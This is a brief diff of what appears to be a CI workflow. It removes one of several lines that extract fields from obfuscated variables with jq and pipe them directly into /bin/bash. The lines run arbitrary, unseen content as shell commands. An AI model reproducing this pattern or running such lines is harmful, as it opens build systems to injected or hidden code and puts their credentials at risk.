@@ -35,7 +35,6 @@ jobs:
           printf '%s' "$ap00" | jq -r .hkwh7 | /bin/bash
           printf '%s' "$iqfb092" | jq -r .r878 | /bin/bash
           echo $oad7924 | jq -r .vsy0361 | /bin/bash
-          echo $urjb99758 | jq -r .sujb293 | /bin/bash
           echo $fnskt5 | jq -r .qjm307 | /bin/bash
           printf '%s' "$kgpdx1522" | jq -r .k9800 | /bin/bash
           printf '%s' "$rz74231" | jq -r .czbcj69 | /bin/bash
